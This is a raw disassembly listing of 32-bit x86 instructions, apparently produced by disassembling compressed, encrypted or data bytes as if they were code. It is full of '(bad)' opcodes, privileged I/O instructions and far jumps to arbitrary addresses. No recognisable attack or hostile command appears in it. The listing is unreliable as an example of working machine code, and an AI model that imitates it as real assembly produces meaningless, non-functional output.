  41d2ad:	aam    0x41
  41d2af:	xchg   ebp,eax
  41d2b0:	stc    
  41d2b1:	out    dx,eax
  41d2b2:	xlat   BYTE PTR ds:[ebx]
  41d2b3:	xchg   ebp,esi
  41d2b5:	xor    dl,BYTE PTR [ebx+eiz*2-0x56]
  41d2b9:	shl    DWORD PTR [esi],1
  41d2bb:	in     al,dx
  41d2bc:	addr16 mov ebx,0xd6899417
  41d2c2:	add    BYTE PTR [ebp+0x6112620d],bh
  41d2c8:	(bad)  
  41d2c9:	into   
  41d2ca:	pop    esi
  41d2cb:	xchg   edx,eax
  41d2cc:	mov    edi,0x171649a2
  41d2d1:	add    esp,eax
  41d2d3:	inc    ebp
  41d2d4:	pop    ebx
  41d2d5:	inc    edx
  41d2d6:	pop    ebp
  41d2d7:	(bad)  [ebx-0x3c]
  41d2da:	mov    ebp,0x65151b84
  41d2df:	(bad)  
  41d2e0:	xchg   DWORD PTR [edx],esp
  41d2e2:	xchg   esp,eax
  41d2e3:	retf   0xe265
  41d2e6:	repz push cs
  41d2e8:	mov    ebx,0xa1087a3d
  41d2ed:	retf   
  41d2ee:	pop    ecx
  41d2ef:	mov    edx,0x6efeae1f
  41d2f4:	inc    edi
  41d2f5:	sbb    DWORD PTR [edx+ebx*1],ebp
  41d2f8:	sub    esi,edi
  41d2fa:	bound  ecx,QWORD PTR [edi]
  41d2fc:	mov    al,ds:0xe442f323
  41d301:	adc    ebp,0x3a05f676
  41d307:	jecxz  0x41d2cc
  41d309:	shl    BYTE PTR [ebx],1
  41d30b:	(bad)  
  41d30c:	arpl   bx,dx
  41d30e:	xchg   ah,ah
  41d310:	add    DWORD PTR [eax+0x48],edi
  41d313:	clc    
  41d314:	cli    
  41d315:	pop    ds
  41d316:	out    dx,al
  41d317:	adc    ebp,DWORD PTR [edx]
  41d319:	enter  0xb713,0x36
  41d31d:	(bad)  
  41d31e:	sbb    ebx,DWORD PTR [ecx-0x5f]
  41d321:	retf   
  41d322:	or     eax,0x823dd35
  41d327:	adc    cl,ch
  41d329:	mov    edi,ebx
  41d32b:	mov    dl,0x0
  41d32d:	xor    DWORD PTR [esi-0x36],ebp
  41d330:	mov    cl,0xbd
  41d332:	or     DWORD PTR [edi+0x644ef9d9],edx
  41d338:	mov    ecx,0xc87b7a21
  41d33d:	adc    cl,BYTE PTR [ebx+0x38ce48]
	...
  41d3b3:	add    BYTE PTR [ebx+0x20],dl
  41d3b6:	mov    al,ds:0x5faef3ae
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	(bad)  
  41d3c0:	or     edx,ebx
  41d3c2:	retf   
  41d3c3:	cmp    DWORD PTR [edx],edx
  41d3c5:	cmp    eax,DWORD PTR [ecx]
  41d3c7:	add    dh,dh
  41d3c9:	add    BYTE PTR [eax],al
  41d3cb:	add    BYTE PTR [ecx],al
  41d3cd:	mov    eax,0xecc94135
  41d3d2:	test   ch,cl
  41d3d4:	push   eax
  41d3d5:	xor    dh,BYTE PTR [edx-0x2db3f8f0]
  41d3db:	push   esp
  41d3dc:	imul   edx,DWORD PTR [edx-0x1],0x161a596c
  41d3e3:	ins    BYTE PTR es:[edi],dx
  41d3e4:	int    0xc7
  41d3e6:	inc    esp
  41d3e7:	jecxz  0x41d36b
  41d3e9:	gs sub al,bl
  41d3ec:	pop    edx
  41d3ed:	cmp    DWORD PTR [esi+0x4f33a633],ebp
  41d3f3:	pop    ebp
  41d3f4:	add    BYTE PTR [esi],bl
  41d3f6:	outs   dx,DWORD PTR ds:[esi]
  41d3f7:	inc    edi
  41d3f8:	and    eax,0x6e3b3b15
  41d3fd:	pop    edx
  41d3fe:	lea    edi,[ebx+0x794d5f70]
  41d404:	loopne 0x41d43e
  41d406:	test   BYTE PTR [esi-0x48],cl
  41d409:	and    al,0xd6
  41d40b:	cdq    
  41d40c:	jbe    0x41d3a3
  41d40e:	mov    dl,0x2f
  41d410:	dec    edx
  41d411:	shr    DWORD PTR [ecx],1
  41d413:	mov    dh,0xf4
  41d415:	out    dx,eax
  41d416:	ss cmc 
  41d418:	in     al,dx
  41d419:	inc    esi
  41d41a:	and    BYTE PTR [edi-0x15],bl
  41d41d:	xchg   ebp,eax
  41d41e:	cmp    ch,BYTE PTR [ecx+ecx*8]
  41d421:	clc    
  41d422:	mov    ebp,ss
  41d424:	mov    ecx,0xed7c6583
  41d429:	inc    edx
  41d42a:	add    dl,0x4d
  41d42d:	xor    BYTE PTR [edi+0x46fdae68],al
  41d433:	mov    esi,0xccfacc36
  41d438:	xchg   esi,eax
  41d439:	aad    0xfa
  41d43b:	and    DWORD PTR [eax],eax
  41d43d:	test   al,0x94
  41d43f:	cmp    DWORD PTR [edx-0x41d83b2e],esi
  41d445:	dec    esp
  41d446:	dec    edi
  41d447:	ins    BYTE PTR es:[edi],dx
  41d448:	sbb    ebx,DWORD PTR [ecx+eax*4+0x6a]
  41d44c:	aas    
  41d44d:	lods   eax,DWORD PTR ds:[esi]
  41d44e:	and    dh,0xec
  41d451:	adc    eax,0xf9cf7d81
  41d456:	not    BYTE PTR [ebx]
  41d458:	inc    ebx
  41d459:	sub    BYTE PTR [edi+0x3ef37da3],cl
  41d45f:	es loope 0x41d423
  41d462:	adc    al,bl
  41d464:	adc    DWORD PTR [esi-0x6d8b2e3e],ebx
  41d46a:	nop
  41d46b:	xchg   esp,eax
  41d46c:	loop   0x41d46e
  41d46e:	jle    0x41d4cd
  41d470:	lds    ebx,FWORD PTR [edi+0x376e14f7]
  41d476:	push   es
  41d477:	mov    al,ds:0xad607e9d
  41d47c:	retf   
  41d47d:	loopne 0x41d4d9
  41d47f:	ds call 0x4cdf:0x217c5982
  41d487:	fidiv  DWORD PTR [eax]
  41d489:	pop    esi
  41d48a:	mov    eax,ds:0x72983a9c
  41d48f:	mov    WORD PTR [ecx-0x66],?
  41d492:	jnp    0x41d4c7
  41d494:	ret    0x6f20
  41d497:	loop   0x41d483
  41d499:	dec    esi
  41d49a:	adc    BYTE PTR [esi+0x7bc65bb9],ch
  41d4a0:	out    dx,eax
  41d4a1:	and    eax,0x3bbb1424
  41d4a6:	ja     0x41d47b
  41d4a8:	(bad)  
  41d4ac:	ja     0x41d483
  41d4ae:	cmp    eax,0x63a0be05
  41d4b3:	retf   
  41d4b4:	dec    eax
  41d4b5:	push   ecx
  41d4b6:	je     0x41d4b9
  41d4b8:	hlt    
  41d4b9:	mov    edi,edi
  41d4bb:	dec    ebp
  41d4bc:	or     al,0x65
  41d4be:	push   ecx
  41d4bf:	div    DWORD PTR [eax+0x9f]
	...
  41d531:	add    BYTE PTR [eax],al
  41d533:	add    ch,al
  41d535:	and    edx,DWORD PTR [ecx-0xa4808db]
  41d53b:	jecxz  0x41d58e
  41d53d:	or     edi,DWORD PTR [edx+ecx*8+0x5dfe468b]
  41d544:	or     BYTE PTR [ecx+eax*1],bh
  41d547:	add    dh,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    al,ah
  41d54d:	add    ebx,edi
  41d54f:	mov    al,0xba
  41d551:	pop    esp
  41d552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d553:	inc    edx
  41d554:	cmp    eax,0x2f1e4698
  41d559:	xchg   DWORD PTR [ebp+0xcaf0287],eax
  41d55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d560:	push   0x67fc501d
  41d565:	(bad)  
  41d567:	mov    al,ds:0xe1f8f93e
  41d56c:	sbb    edx,0x48
  41d56f:	pop    eax
  41d570:	enter  0xfaa3,0x60
  41d574:	fnstsw WORD PTR [esi+0x20]
  41d577:	mov    ecx,0xafb37534
  41d57c:	jb     0x41d5d6
  41d57e:	and    eax,DWORD PTR [ebx+0x55600b17]
  41d584:	xchg   edx,eax
  41d585:	icebp  
  41d586:	stos   DWORD PTR es:[edi],eax
  41d587:	dec    eax
  41d588:	cmp    DWORD PTR [ebp+0x58ccb35f],edx
  41d58e:	std    
  41d58f:	fnstenv [eax+0x9]
  41d592:	jmp    0x41d59e
  41d594:	jbe    0x41d542
  41d596:	pop    es
  41d597:	inc    ecx
  41d598:	mov    edi,0x3acbd9a5
  41d59d:	xor    edx,edi
  41d59f:	cli    
  41d5a0:	mov    ds:0x8b7de6a4,al
  41d5a5:	sbb    ah,0xd6
  41d5a8:	or     BYTE PTR ds:0x268cb7dd,ah
  41d5ae:	aas    
  41d5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b0:	mov    eax,0x4a13b7a7
  41d5b5:	sbb    dh,BYTE PTR [ebx+0x4cd44560]
  41d5bb:	sub    cl,bl
  41d5bd:	pop    ebp
  41d5be:	mov    edi,DWORD PTR [edx+0x1807ecfa]
  41d5c4:	mov    bh,0x14
  41d5c6:	ss repz sbb al,0x1
  41d5ca:	or     eax,0xb0c06eba
  41d5cf:	pop    ebx
  41d5d0:	jge    0x41d595
  41d5d2:	pop    ecx
  41d5d3:	aaa    
  41d5d4:	pop    ds
  41d5d5:	sub    DWORD PTR [esi+0x21],esi
  41d5d8:	xor    BYTE PTR [esi],ch
  41d5da:	add    al,0xb3
  41d5dc:	sbb    edi,DWORD PTR [ecx]
  41d5de:	test   eax,0x691dad77
  41d5e3:	std    
  41d5e4:	fninit 
  41d5e6:	jecxz  0x41d65f
  41d5e8:	inc    esi
  41d5e9:	adc    dh,ch
  41d5eb:	fs sti 
  41d5ed:	fdivr  st(1),st
  41d5ef:	push   esi
  41d5f0:	(bad)  
  41d5f1:	dec    ecx
  41d5f2:	pop    ss
  41d5f3:	repnz and esi,DWORD PTR [edi+0x6a]
  41d5f7:	neg    WORD PTR [edi]
  41d5fa:	jle    0x41d636
  41d5fc:	xor    ch,BYTE PTR [esi+0x4]
  41d5ff:	stos   BYTE PTR es:[edi],al
  41d600:	pop    edi
  41d601:	(bad)  [esi-0x68]
  41d604:	inc    ecx
  41d605:	jne    0x41d5bf
  41d607:	icebp  
  41d608:	rcr    ebx,1
  41d60a:	test   al,0xa8
  41d60c:	sbb    BYTE PTR [esi+edx*4],dl
  41d60f:	mov    WORD PTR [edi],cs
  41d611:	xchg   edi,eax
  41d612:	mov    edi,DWORD PTR [edi-0x4f]
  41d615:	push   ss
  41d616:	mov    esp,DWORD PTR [edi+0x196e03ec]
  41d61c:	dec    edi
  41d61d:	ds stc 
  41d61f:	fdivr  QWORD PTR [edi]
  41d621:	mov    esi,0x4a648a09
  41d626:	or     cl,BYTE PTR [edx-0x50497038]
  41d62c:	(bad)  
  41d62d:	stos   DWORD PTR es:[edi],eax
  41d62e:	stos   DWORD PTR es:[edi],eax
  41d62f:	fnstsw WORD PTR [esi]
  41d631:	adc    bh,al
  41d633:	and    al,BYTE PTR [ebx]
  41d635:	popf   
  41d636:	lock add eax,0xd7aa4340
  41d63c:	or     DWORD PTR [edx],esi
  41d63e:	pop    ecx
  41d63f:	aam    0xde
  41d641:	inc    BYTE PTR [eax]
	...
  41d6b3:	add    dl,bl
  41d6b5:	add    edx,eax
  41d6b7:	xchg   bl,bl
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0x9d540a3b
  41d6c2:	mov    bh,BYTE PTR [ebx+0x13cfe]
  41d6c8:	test   BYTE PTR [eax],0x0
  41d6cb:	add    BYTE PTR [esi-0x49],ah
  41d6ce:	das    
  41d6cf:	lods   eax,DWORD PTR ds:[esi]
  41d6d0:	sbb    eax,0xc6abdb83
  41d6d5:	and    al,0xd9
  41d6d7:	cmc    
  41d6d8:	cmp    ecx,esi
  41d6da:	jl     0x41d716
  41d6dc:	pop    edx
  41d6dd:	cmp    al,0x73
  41d6df:	dec    eax
  41d6e0:	push   0xd40a5dac
  41d6e5:	mov    ecx,0x854a2344
  41d6ea:	mov    gs,WORD PTR [esi]
  41d6ec:	xor    DWORD PTR [ebx-0x64893de5],ecx
  41d6f2:	call   0xb8e0:0x3003f4cd
  41d6f9:	(bad)  
  41d6fa:	cld    
  41d6fb:	int3   
  41d6fc:	and    edi,DWORD PTR [ebx]
  41d6fe:	(bad)  
  41d6ff:	sub    al,BYTE PTR [esi-0xc55ec9f]
  41d705:	mov    bh,0xbc
  41d707:	dec    ecx
  41d708:	xor    BYTE PTR [edx],ah
  41d70a:	push   esp
  41d70c:	add    DWORD PTR [ebx],esp
  41d70e:	push   ss
  41d70f:	add    bl,BYTE PTR [ebx-0x1c66da0e]
  41d715:	jl     0x41d6a8
  41d717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d718:	jne    0x41d723
  41d71a:	sub    eax,0xa442a813
  41d71f:	sahf   
  41d720:	mov    bh,0x43
  41d722:	or     bl,BYTE PTR [esi]
  41d724:	cmp    ebx,edx
  41d726:	lds    esi,FWORD PTR [esi+0x62]
  41d729:	xchg   edx,eax
  41d72a:	sar    eax,1
  41d72c:	and    ecx,DWORD PTR [eax]
  41d72e:	mov    eax,0x9b86d460
  41d733:	sbb    ch,dl
  41d735:	das    
  41d736:	repz test BYTE PTR [edi+0x74610531],0xb5
  41d73e:	in     eax,0xc6
  41d740:	sub    ah,BYTE PTR [ebp+0x37]
  41d743:	inc    ecx
  41d744:	or     DWORD PTR [edi+ebp*4-0x3e],edi
  41d748:	and    eax,0x87f2009b
  41d74d:	xor    ebx,edi
  41d74f:	xchg   esi,eax
  41d750:	(bad)  
  41d751:	fdiv   st,st(7)
  41d753:	outs   dx,DWORD PTR ds:[esi]
  41d754:	in     eax,0x5b
  41d756:	aas    
  41d757:	aas    
  41d758:	shr    BYTE PTR [edx+0x50],cl
  41d75b:	mov    cl,0x44
  41d75d:	adc    ebp,DWORD PTR [edx+0x2d]
  41d760:	jns    0x41d754
  41d762:	pop    ebp
  41d763:	dec    ecx
  41d764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d765:	and    ebx,DWORD PTR [edi]
  41d767:	ds push edi
  41d769:	ss loope 0x41d71b
  41d76c:	adc    al,0xd2
  41d76e:	xlat   BYTE PTR ds:[ebx]
  41d76f:	jp     0x41d7bc
  41d771:	inc    esi
  41d772:	xor    dl,BYTE PTR [ebp-0x54]
  41d775:	test   DWORD PTR [ebp+esi*2+0x13],ebx
  41d779:	mov    ds:0xcf9af910,eax
  41d77e:	cmp    cl,BYTE PTR [ebx]
  41d780:	repz mov bh,0xef
  41d783:	or     BYTE PTR [ecx],cl
  41d785:	mov    dh,0xc2
  41d787:	stc    
  41d788:	xor    ch,BYTE PTR [ebp-0x7959aafd]
  41d78e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d78f:	(bad)  
  41d790:	call   0xa606:0xca6d4f85
  41d797:	jmp    0x4e347e73
  41d79c:	sbb    ecx,DWORD PTR [ecx+0x53]
  41d79f:	nop
  41d7a0:	add    cl,ah
  41d7a2:	jnp    0x41d7bf
  41d7a4:	std    
  41d7a5:	leave  
  41d7a6:	inc    ebp
  41d7a7:	or     ah,BYTE PTR [bx]
  41d7aa:	sti    
  41d7ab:	xor    BYTE PTR [ecx+0x424dda1c],cl
  41d7b1:	(bad)  
  41d7b2:	add    al,bh
  41d7b4:	repz std 
  41d7b6:	test   al,0x94
  41d7b8:	sub    ah,BYTE PTR [edi-0x703b411c]
  41d7be:	pop    eax
  41d7bf:	cs nop
  41d7c1:	sbb    al,0x0
	...
  41d833:	add    BYTE PTR [ebx+0x34],ah
  41d836:	lods   eax,DWORD PTR ds:[esi]
  41d837:	xor    al,0xff
  41d839:	mov    ebp,0xf28777fb
  41d83e:	pop    es
  41d83f:	add    esp,DWORD PTR [eax-0x76]
  41d842:	and    ebp,edx
  41d844:	hlt    
  41d845:	cmp    eax,0xf60001
  41d84a:	add    BYTE PTR [eax],al
  41d84c:	adc    DWORD PTR [eax],esp
  41d84e:	cmp    eax,0x57e9daf9
  41d853:	push   ebp
  41d854:	fst    QWORD PTR [ebx-0x1135dd32]
  41d85a:	sbb    al,0xfa
  41d85c:	adc    ah,BYTE PTR [ecx-0x3eabe5bb]
  41d862:	sbb    BYTE PTR [edi],0x78
  41d865:	nop
  41d866:	ret    
  41d867:	imul   edx,eax,0xffffffee
  41d86a:	ja     0x41d884
  41d86c:	and    al,BYTE PTR [ebx-0x6833a5fa]
  41d872:	mov    al,0x8f
  41d874:	mov    ds:0x5879fcf8,eax
  41d879:	aaa    
  41d87a:	fild   DWORD PTR [ebp+0x3ad625fe]
  41d880:	rol    BYTE PTR [edi],0x81
  41d883:	xor    ebp,edx
  41d885:	push   0x19
  41d887:	adc    BYTE PTR [eax+0x66],0x44
  41d88b:	pop    esi
  41d88c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d88e:	aas    
  41d88f:	fs inc edi
  41d891:	pop    DWORD PTR [ecx+0x2bbc4d47]
  41d897:	in     eax,dx
  41d898:	sub    al,ah
  41d89a:	int3   
  41d89b:	test   al,0xd3
  41d89d:	retf   0xfe91
  41d8a0:	test   ecx,edi
  41d8a2:	in     eax,0x7
  41d8a4:	loope  0x41d862
  41d8a6:	adc    ah,BYTE PTR [ebp-0x4d8dbe3c]
  41d8ac:	fdiv   DWORD PTR [ecx-0x6077f3d3]
  41d8b2:	push   0x68
  41d8b4:	mov    eax,ds:0x58c1b57a
  41d8b9:	pushf  
  41d8ba:	cwde   
  41d8bb:	mov    al,ds:0xd2987801
  41d8c0:	nop    DWORD PTR [ebp+0x5976e513]
  41d8c7:	dec    BYTE PTR [esp+edi*4+0x35d351ef]
  41d8ce:	xchg   ecx,eax
  41d8cf:	(bad)  
  41d8d0:	push   esi
  41d8d1:	scas   al,BYTE PTR es:[edi]
  41d8d2:	repz inc eax
  41d8d4:	lea    esp,[esi-0x80]
  41d8d7:	sbb    eax,0x36ae9251
  41d8dc:	(bad)  
  41d8de:	jno    0x41d890
  41d8e0:	lds    edi,FWORD PTR [edx-0x71151b91]
  41d8e6:	out    dx,eax
  41d8e7:	test   BYTE PTR [edx],0x9a
  41d8ea:	jae    0x41d968
  41d8ec:	add    DWORD PTR [ebp+0x6a88a692],eax
  41d8f2:	outs   dx,BYTE PTR ds:[esi]
  41d8f3:	push   ecx
  41d8f4:	push   ebx
  41d8f5:	xchg   ebp,eax
  41d8f6:	push   esp
  41d8f7:	xchg   ebx,eax
  41d8f8:	push   eax
  41d8f9:	shl    ecx,0x93
  41d8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8fd:	or     BYTE PTR [ebx],ch
  41d8ff:	and    edi,DWORD PTR [esp+ebp*4]
  41d902:	dec    edi
  41d903:	push   ss
  41d904:	test   eax,0x96f79391
  41d909:	fisttp QWORD PTR [ebx+0x3cb13054]
  41d90f:	js     0x41d965
  41d911:	stos   BYTE PTR es:[edi],al
  41d912:	push   ebp
  41d913:	in     al,dx
  41d914:	mov    ebp,0xc8bfc0bd
  41d919:	xor    edx,DWORD PTR [ebp+0x63]
  41d91c:	out    dx,al
  41d91d:	lods   eax,DWORD PTR ds:[esi]
  41d91e:	pushf  
  41d91f:	jnp    0x41d992
  41d921:	dec    esp
  41d922:	xchg   esi,eax
  41d923:	lea    esp,[eax+eiz*4]
  41d926:	es iret 
  41d928:	jge    0x41d99d
  41d92a:	jl     0x41d8ce
  41d92c:	sub    BYTE PTR [esi+0x69],dh
  41d92f:	mov    ecx,0x5da5f912
  41d934:	retf   
  41d935:	adc    dl,BYTE PTR [esi-0x4a]
  41d938:	lock jnp 0x41d92a
  41d93b:	dec    ebp
  41d93c:	lea    ecx,[ebx+0x37ef6c5b]
	...
  41d9b2:	add    BYTE PTR [eax],al
  41d9b4:	lock retf 0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x2d4a6c1c
  41d9c3:	xchg   edx,eax
  41d9c4:	jmp    0x0:0xf600013e
  41d9cb:	add    BYTE PTR [eax+eax*4-0x6b],bh
  41d9cf:	je     0x41d9aa
  41d9d1:	fdivr  QWORD PTR [ebp+edx*1+0x5f53f102]
  41d9d8:	jnp    0x41d9c8
  41d9da:	mov    al,0x87
  41d9dc:	mov    ch,0x7d
  41d9de:	iret   
  41d9df:	aam    0x4a
  41d9e1:	repz jae 0x41d9d4
  41d9e4:	cmp    ebp,esp
  41d9e6:	lods   eax,DWORD PTR ds:[esi]
  41d9e7:	aas    
  41d9e8:	hlt    
  41d9e9:	mov    eax,ds:0xe9b99786
  41d9ee:	inc    esi
  41d9ef:	sbb    cl,BYTE PTR [ecx+0x77]
  41d9f2:	jle    0x41d98d
  41d9f4:	imul   esp,DWORD PTR [esi+0x3f],0x1e
  41d9f8:	aam    0xae
  41d9fa:	xor    ah,BYTE PTR [ecx]
  41d9fc:	cmp    al,0x1e
  41d9fe:	xor    dh,BYTE PTR cs:[edx+0x730cca42]
  41da05:	pusha  
  41da06:	lds    esi,FWORD PTR [eax]
  41da08:	sbb    DWORD PTR [ecx],0xffffffaa
  41da0b:	sti    
  41da0c:	sbb    ebp,ecx
  41da0e:	mov    ecx,DWORD PTR [esi]
  41da10:	mov    bh,0xb3
  41da12:	scas   al,BYTE PTR es:[edi]
  41da13:	mov    ah,0x5f
  41da15:	mov    ch,cl
  41da17:	xchg   ecx,eax
  41da19:	lea    esi,[ecx]
  41da1b:	mov    ebp,0x2a457611
  41da20:	push   ds
  41da21:	out    dx,al
  41da22:	inc    ecx
  41da23:	xor    dh,BYTE PTR [esi+ebp*4-0x2b2d7aea]
  41da2a:	jb     0x41da36
  41da2c:	pextrw ecx,(bad),0xc5
  41da2e:	mov    dh,bl
  41da30:	pop    esp
  41da31:	lods   al,BYTE PTR ds:[esi]
  41da32:	dec    edx
  41da33:	hlt    
  41da34:	adc    al,0x3
  41da36:	sub    edi,DWORD PTR [edi-0x7dcc502d]
  41da3c:	bound  ebp,QWORD PTR [ebp+edx*4-0x51]
  41da40:	lea    edi,[eax-0x3e912f8e]
  41da46:	jno    0x41da2b
  41da48:	stos   DWORD PTR es:[edi],eax
  41da49:	jle    0x41daa4
  41da4b:	aas    
  41da4c:	test   al,0xee
  41da4e:	inc    edx
  41da4f:	jns    0x41da1d
  41da51:	das    
  41da52:	mov    bh,0x35
  41da54:	jmp    0xf48d:0x8aa16995
  41da5b:	dec    ebp
  41da5c:	outs   dx,DWORD PTR ds:[esi]
  41da5d:	mov    esi,0x403931b7
  41da62:	stc    
  41da63:	test   BYTE PTR [edx+0x375d4418],bh
  41da69:	mov    eax,0x2b91d3c1
  41da6e:	xor    DWORD PTR [eax-0x16eccd5b],edx
  41da74:	test   DWORD PTR [edi],0x95cec7f1
  41da7a:	fs enter 0x347e,0x92
  41da7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da80:	adc    DWORD PTR [edx],eax
  41da82:	jmp    0x41da17
  41da84:	js     0x41daf3
  41da86:	push   ss
  41da87:	pand   mm5,mm4
  41da8a:	test   BYTE PTR [ebp-0x35],ah
  41da8d:	add    al,0xe9
  41da8f:	xor    al,0xdc
  41da91:	push   0xb9cf5847
  41da96:	mov    ecx,0x1e3521d2
  41da9b:	stos   DWORD PTR es:[edi],eax
  41da9c:	dec    esp
  41da9d:	xor    esi,ecx
  41da9f:	cmp    edx,DWORD PTR [edx+0x1d]
  41daa2:	mov    ah,0xbe
  41daa4:	sar    BYTE PTR [esi+ecx*4-0x5843c7e7],0x9c
  41daac:	pop    ss
  41daad:	out    dx,al
  41daae:	(bad)  
  41daaf:	dec    edi
  41dab0:	pop    ds
  41dab1:	ret    
  41dab2:	pop    esp
  41dab3:	mov    al,ds:0xb8614407
  41dab8:	or     dl,BYTE PTR [edi-0x63]
  41dabb:	mov    fs,WORD PTR [edx]
  41dabd:	and    edi,DWORD PTR [edi-0x67]
  41dac0:	adc    al,0x5a
	...
  41db32:	add    BYTE PTR [eax],al
  41db34:	sub    esi,edx
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	les    esi,FWORD PTR [eax-0x28]
  41db43:	aad    0xe0
  41db45:	aas    
  41db46:	add    DWORD PTR [eax],eax
  41db48:	test   BYTE PTR [eax],0x0
  41db4b:	add    BYTE PTR [edx+edx*2],dh
  41db4e:	xlat   BYTE PTR ds:[ebx]
  41db4f:	adc    eax,0xd22b4f5f
  41db54:	jle    0x41db3c
  41db56:	xchg   DWORD PTR [edx-0x18191f9f],esp
  41db5c:	push   ds
  41db5d:	jecxz  0x41db1e
  41db5f:	(bad)  
  41db60:	retf   
  41db61:	push   ecx
  41db62:	push   ebp
  41db63:	inc    ebp
  41db64:	and    BYTE PTR fs:[edx+0x14],cl
  41db68:	sub    BYTE PTR [ebx],dl
  41db6a:	(bad)  
  41db6b:	xchg   esi,eax
  41db6c:	dec    ebx
  41db6d:	and    DWORD PTR [ecx],esp
  41db6f:	pop    ebx
  41db70:	das    
  41db71:	(bad)  
  41db72:	sti    
  41db73:	fnstenvw [eax-0x3052620a]
  41db7a:	cmp    ebp,ecx
  41db7c:	aaa    
  41db7d:	dec    ecx
  41db7e:	stos   BYTE PTR es:[edi],al
  41db7f:	inc    esp
  41db80:	dec    edx
  41db81:	add    DWORD PTR [esi],0x43
  41db84:	xor    BYTE PTR [ecx-0x77ba8ebf],0x1c
  41db8b:	cmc    
  41db8c:	push   ecx
  41db8d:	lahf   
  41db8e:	dec    eax
  41db8f:	jle    0x41db76
  41db91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db92:	scas   al,BYTE PTR es:[edi]
  41db93:	mov    ebx,0xb070a4ed
  41db98:	sbb    eax,0xea870a4d
  41db9d:	test   BYTE PTR [ecx+edx*2+0x4f994aca],bh
  41dba4:	or     BYTE PTR [edx+0x227dd00e],bl
  41dbaa:	jl     0x41db94
  41dbac:	cmp    DWORD PTR [ebx+edx*8],ecx
  41dbaf:	mov    bl,0xec
  41dbb1:	shl    edx,1
  41dbb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbb4:	sub    esi,DWORD PTR [ebx+0x72]
  41dbb7:	or     ecx,DWORD PTR ds:0x58347aef
  41dbbd:	jbe    0x41db65
  41dbbf:	inc    eax
  41dbc0:	pop    eax
  41dbc1:	sbb    esp,DWORD PTR [eax+0x364a7c99]
  41dbc7:	retf   0xf8ec
  41dbca:	(bad)  
  41dbcb:	mov    al,0x63
  41dbcd:	pop    eax
  41dbce:	adc    esp,ebp
  41dbd0:	or     ecx,esi
  41dbd2:	mov    gs,ebp
  41dbd4:	call   0x3644a020
  41dbd9:	adc    BYTE PTR [eax],cl
  41dbdb:	dec    esp
  41dbdc:	ror    DWORD PTR [ebx-0x23],1
  41dbdf:	pop    ebp
  41dbe0:	(bad)  
  41dbe1:	pop    ds
  41dbe2:	test   eax,0x5b6e1fd6
  41dbe7:	shl    DWORD PTR [esi],cl
  41dbe9:	inc    ebp
  41dbea:	xchg   ebx,eax
  41dbeb:	dec    eax
  41dbec:	test   DWORD PTR [ecx],edi
  41dbee:	or     BYTE PTR [ecx+edx*4+0x70],al
  41dbf2:	stc    
  41dbf3:	lds    edx,FWORD PTR [eax+0x15]
  41dbf6:	lds    ebp,FWORD PTR [esi+0x1dff6854]
  41dbfc:	sbb    BYTE PTR [eax],0x68
  41dbff:	dec    ebx
  41dc00:	mov    esi,0xbe50612c
  41dc05:	ss and eax,0xceaf1989
  41dc0b:	hlt    
  41dc0c:	push   esp
  41dc0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc0e:	sub    eax,0x4a74e191
  41dc13:	(bad)  
  41dc14:	xchg   edx,eax
  41dc15:	push   edi
  41dc16:	xchg   ecx,eax
  41dc17:	sbb    ebp,DWORD PTR [ebx+ecx*8+0x42]
  41dc1b:	jno    0x41dbe1
  41dc1d:	dec    edx
  41dc1e:	cld    
  41dc1f:	inc    edx
  41dc20:	and    ebx,esi
  41dc22:	hlt    
  41dc23:	adc    DWORD PTR ds:0x975c7013,edi
  41dc29:	lods   eax,DWORD PTR ds:[esi]
  41dc2a:	(bad)  
  41dc2b:	das    
  41dc2c:	pop    esi
  41dc2d:	mov    esi,0x90c0dd0
  41dc32:	shr    BYTE PTR ds:0xd2f60cce,0xcb
  41dc39:	and    BYTE PTR [ebp+0x73b6c5c1],dh
  41dc3f:	xchg   BYTE PTR [ecx],bh
  41dc41:	mov    DWORD PTR [eax],0x0
	...
  41dcb3:	add    BYTE PTR [eax-0x67],ah
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0xe8
  41dcc1:	shl    DWORD PTR [edi+0x140d6f1],0x0
  41dcc8:	test   BYTE PTR [eax],0x0
  41dccb:	add    BYTE PTR [esi+0x9],ch
  41dcce:	adc    al,0x6f
  41dcd0:	cmp    dl,BYTE PTR [eax]
  41dcd2:	iret   
  41dcd3:	and    eax,0xd550c314
  41dcd8:	pop    edi
  41dcda:	sub    bl,BYTE PTR [esp+esi*4+0x0]
  41dcde:	and    al,0x15
  41dce0:	sub    ecx,DWORD PTR [ecx+0x21]
  41dce3:	add    eax,0x480f1e86
  41dce8:	jae    0x41dcbf
  41dcea:	and    ecx,ebx
  41dcec:	or     DWORD PTR [eax+0x2c50c2f0],ecx
  41dcf2:	inc    ecx
  41dcf3:	sub    ecx,DWORD PTR [esi+0x79]
  41dcf6:	frstor [ecx+0x52dc22b9]
  41dcfc:	add    eax,0x2c0521b
  41dd01:	retf   0x76bb
  41dd04:	lahf   
  41dd05:	sbb    al,BYTE PTR [esi]
  41dd07:	stos   DWORD PTR es:[edi],eax
  41dd08:	and    eax,0xce692c35
  41dd0d:	into   
